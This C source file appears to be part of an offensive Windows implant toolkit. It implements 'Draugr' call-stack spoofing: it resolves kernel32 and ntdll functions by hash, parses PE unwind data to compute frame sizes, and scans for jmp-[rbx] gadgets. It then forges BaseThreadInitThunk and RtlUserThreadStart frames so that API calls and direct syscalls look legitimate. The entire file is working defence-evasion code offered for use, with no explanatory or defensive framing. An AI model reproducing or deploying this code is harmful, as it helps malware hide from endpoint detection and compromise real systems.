#include <windows.h>
#include "spoof.h"
#include "tcg.h"

DECLSPEC_IMPORT RUNTIME_FUNCTION * WINAPI KERNEL32$RtlLookupFunctionEntry( DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE );
DECLSPEC_IMPORT ULONG              NTAPI  NTDLL$RtlRandomEx( PULONG );

#define TEXT_HASH   0xEBC2F9B4
#define RBP_OP_INFO 0x5

typedef struct {
    LPCWSTR   DllPath;
    ULONG     Offset;
    ULONGLONG TotalStackSize;
    BOOL      RequiresLoadLibrary;
    BOOL      SetsFramePointer;
    PVOID     ReturnAddress;
    BOOL      PushRbp;
    ULONG     CountOfCodes;
    BOOL      PushRbpIndex;
} STACK_FRAME;

typedef enum {
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef unsigned char UBYTE;

typedef union {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE;

typedef struct {
    UBYTE Version : 3;
    UBYTE Flags   : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode [ 1 ];
} UNWIND_INFO;

typedef struct {
    PVOID ModuleAddress;
    PVOID FunctionAddress;
    DWORD Offset;
} FRAME_INFO;

typedef struct {
    FRAME_INFO Frame1;
    FRAME_INFO Frame2;
    PVOID      Gadget;
} SYNTHETIC_STACK_FRAME;

typedef struct {
    FUNCTION_CALL * FunctionCall;
    PVOID           StackFrame;
    PVOID           SpoofCall;
} DRAUGR_FUNCTION_CALL;

typedef struct {
    PVOID Fixup;
    PVOID OriginalReturnAddress;
    PVOID Rbx;
    PVOID Rdi;
    PVOID BaseThreadInitThunkStackSize;
    PVOID BaseThreadInitThunkReturnAddress;
    PVOID TrampolineStackSize;
    PVOID RtlUserThreadStartStackSize;
    PVOID RtlUserThreadStartReturnAddress;
    PVOID Ssn;
    PVOID Trampoline;
    PVOID Rsi;
    PVOID R12;
    PVOID R13;
    PVOID R14;
    PVOID R15;
} DRAUGR_PARAMETERS;

extern PVOID spoofStub( PVOID, PVOID, PVOID, PVOID, DRAUGR_PARAMETERS *, PVOID, SIZE_T, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID );

#define draugrArg(i) ( PVOID )( ULONG_PTR )( call->args[i] )

void initFrameInfo( SYNTHETIC_STACK_FRAME * frame )
{
    PVOID kernel32 = findModuleByHash( 0x6A4ABC5B );
    PVOID ntdll    = findModuleByHash( 0x3CFA685D );

    frame->Frame1.ModuleAddress   = kernel32;
    frame->Frame1.FunctionAddress = findFunctionByHash( kernel32, 0x43DAE5F3 );
    frame->Frame1.Offset          = 0x17;

    frame->Frame2.ModuleAddress   = ntdll;
    frame->Frame2.FunctionAddress = findFunctionByHash( ntdll, 0x19F5F28A );
    frame->Frame2.Offset          = 0x2c;

    frame->Gadget                 = findModuleByHash( 0x2DEFBAE3 );
}

BOOL getTextSection( PVOID module, PDWORD virtual_address, PDWORD size )
{
    PIMAGE_DOS_HEADER dos_header = ( PIMAGE_DOS_HEADER )( module );
    
    if ( dos_header->e_magic != IMAGE_DOS_SIGNATURE ) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS nt_headers = ( PIMAGE_NT_HEADERS )( ( UINT_PTR )( module ) + dos_header->e_lfanew );
    
    if ( nt_headers->Signature != IMAGE_NT_SIGNATURE ) {
        return FALSE;
    }

    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION( nt_headers );
    
    for ( int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++ )
    {
        DWORD hash = ror13hash ( ( char* )( section_header[i].Name ) );

        if ( hash == TEXT_HASH )
        {
            *virtual_address = section_header[i].VirtualAddress;
            *size            = section_header[i].SizeOfRawData;
            
            return TRUE;
        }
    }

    return FALSE;
}

PVOID calculateFunctionStackSize( PRUNTIME_FUNCTION runtime_function, const DWORD64 image_base )
{
    if ( !runtime_function ) {
        return NULL;
    }

    ULONG unwind_operation    = 0;
    ULONG operation_info      = 0;
    ULONG index               = 0;
    ULONG frame_offset        = 0;
    STACK_FRAME stack_frame = { 0 };

    UNWIND_INFO* unwind_info = ( UNWIND_INFO* )( runtime_function->UnwindData + image_base );
    
    while ( index < unwind_info->CountOfCodes )
    {
        unwind_operation = unwind_info->UnwindCode[ index ].UnwindOp;
        operation_info   = unwind_info->UnwindCode[ index ].OpInfo;

        if ( unwind_operation == UWOP_PUSH_NONVOL )
        {
            stack_frame.TotalStackSize += 8;

            if ( operation_info == RBP_OP_INFO )
            {
                stack_frame.PushRbp      = TRUE;
                stack_frame.CountOfCodes = unwind_info->CountOfCodes;
                stack_frame.PushRbpIndex = index + 1;
            }
        }
        else if ( unwind_operation == UWOP_SAVE_NONVOL )
        {
            index += 1;
        }
        else if ( unwind_operation == UWOP_ALLOC_SMALL )
        {
            stack_frame.TotalStackSize += ( ( operation_info * 8 ) + 8 );
        }
        else if ( unwind_operation == UWOP_ALLOC_LARGE )
        {
            index += 1;
            frame_offset = unwind_info->UnwindCode[ index ].FrameOffset;

            if ( operation_info == 0 )
            {
                frame_offset *= 8;
            }
            else
            {
                index += 1;
                frame_offset += ( unwind_info->UnwindCode[ index ].FrameOffset << 16 );
            }

            stack_frame.TotalStackSize += frame_offset;
        }
        else if ( unwind_operation == UWOP_SET_FPREG )
        {
            stack_frame.SetsFramePointer = TRUE;
        }
        else if ( unwind_operation == UWOP_SAVE_XMM128 )
        {
            return NULL;
        }

        index += 1;
    }

    if ( 0 != ( unwind_info->Flags & UNW_FLAG_CHAININFO ) )
    {
        index = unwind_info->CountOfCodes;

        if ( 0 != ( index & 1 ) )
        {
            index += 1;
        }

        runtime_function = ( PRUNTIME_FUNCTION )( &unwind_info->UnwindCode[index] );
        return calculateFunctionStackSize( runtime_function, image_base );
    }

    stack_frame.TotalStackSize += 8;
    return ( PVOID )( stack_frame.TotalStackSize );
}

PVOID calculateFunctionStackSizeWrapper( PVOID return_address )
{
    if ( !return_address ) {
        return NULL;
    }

    DWORD64               image_base    = 0;
    PUNWIND_HISTORY_TABLE history_table = NULL;

    PRUNTIME_FUNCTION runtime_function = KERNEL32$RtlLookupFunctionEntry(( DWORD64 )( return_address ), &image_base, history_table );

    if ( runtime_function == NULL ) {
        return NULL;
    }

    return calculateFunctionStackSize( runtime_function, image_base );
}

PVOID findGadget( PVOID module )
{
    DWORD section_sz = 0;
    DWORD section_va = 0;

    PVOID gadget_list[15] = { 0 };
    DWORD gadgets_found   = 0;

    if ( !getTextSection( module, &section_va, &section_sz )) {
        return NULL;
    }

    PBYTE ptr = ( PBYTE )( ( UINT_PTR )( module ) + section_va );

    for ( int i = 0; i < ( section_sz - 2 ); i++ )
    {
        /* x64 opcodes are ff 23 */
        if ( ptr[i] == 0xFF && ptr[i + 1] == 0x23 )
        {
            gadget_list[gadgets_found] = ( PVOID )( ( UINT_PTR )( ptr ) + i );
            gadgets_found++;

            if ( gadgets_found == 15 ) {
                break;
            }          
        }
    }

    if ( gadgets_found == 0 ) {
        return NULL;
    }

    ULONG seed = 0x1337;
    ULONG rand = NTDLL$RtlRandomEx( &seed );
    rand %= gadgets_found;

    return gadget_list[rand];
}

ULONG_PTR draugrWrapper( PVOID function, DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8, PVOID arg9, PVOID arg10, PVOID arg11, PVOID arg12 )
{
    int attempts         = 0;
    PVOID return_address = NULL;

    DRAUGR_PARAMETERS draugr_params = { 0 };

    if ( ssn ) {
        draugr_params.Ssn = ( PVOID )( UINT_PTR )( ssn );
    }

    SYNTHETIC_STACK_FRAME frame;
    initFrameInfo( &frame );

    return_address                                 = ( PVOID )( ( UINT_PTR )( frame.Frame1.FunctionAddress ) + frame.Frame1.Offset );
    draugr_params.BaseThreadInitThunkStackSize     = calculateFunctionStackSizeWrapper( return_address );
    draugr_params.BaseThreadInitThunkReturnAddress = return_address;

    if ( !draugr_params.BaseThreadInitThunkStackSize || !draugr_params.BaseThreadInitThunkReturnAddress ) {
        return ( ULONG_PTR )( NULL );
    }

    return_address                                = ( PVOID ) ( ( UINT_PTR )( frame.Frame2.FunctionAddress ) + frame.Frame2.Offset );
    draugr_params.RtlUserThreadStartStackSize     = calculateFunctionStackSizeWrapper( return_address );
    draugr_params.RtlUserThreadStartReturnAddress = return_address;

    if ( !draugr_params.RtlUserThreadStartStackSize || !draugr_params.RtlUserThreadStartReturnAddress ) {
        return ( ULONG_PTR ) ( NULL );
    }

    do
    {
        draugr_params.Trampoline          = findGadget( frame.Gadget );
        draugr_params.TrampolineStackSize = calculateFunctionStackSizeWrapper( draugr_params.Trampoline );
        
        attempts++;

        if ( attempts > 15 ) {
            return ( ULONG_PTR )( NULL );
        }

    } while ( draugr_params.TrampolineStackSize == NULL || ( ( u_int64 )( draugr_params.TrampolineStackSize ) < 0x80 ));

    if ( !draugr_params.Trampoline || !draugr_params.TrampolineStackSize ) {
        return ( ULONG_PTR )( NULL );
    }

    return ( ULONG_PTR )( spoofStub( arg1, arg2, arg3, arg4, &draugr_params, function, 8, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12 ));
}

ULONG_PTR spoofCall( FUNCTION_CALL * call )
{
    if ( call->argc == 0 ) {
        return draugrWrapper( call->ptr, call->ssn, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 1 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 2 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 3 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 4 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 5 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 6 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 7 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 8 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), draugrArg(7), NULL, NULL, NULL, NULL );
    } else if ( call->argc == 9 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), draugrArg(7), draugrArg(8), NULL, NULL, NULL );
    } else if ( call->argc == 10 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), draugrArg(7), draugrArg(8), draugrArg(9), NULL, NULL );
    } else if ( call->argc == 11 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), draugrArg(7), draugrArg(8), draugrArg(9), draugrArg(10), NULL );
    } else if ( call->argc == 12 ) {
        return draugrWrapper( call->ptr, call->ssn, draugrArg(0), draugrArg(1), draugrArg(2), draugrArg(3), draugrArg(4), draugrArg(5), draugrArg(6), draugrArg(7), draugrArg(8), draugrArg(9), draugrArg(10), draugrArg(11) );
    } else {
        return ( ULONG_PTR )( NULL );
    }
}
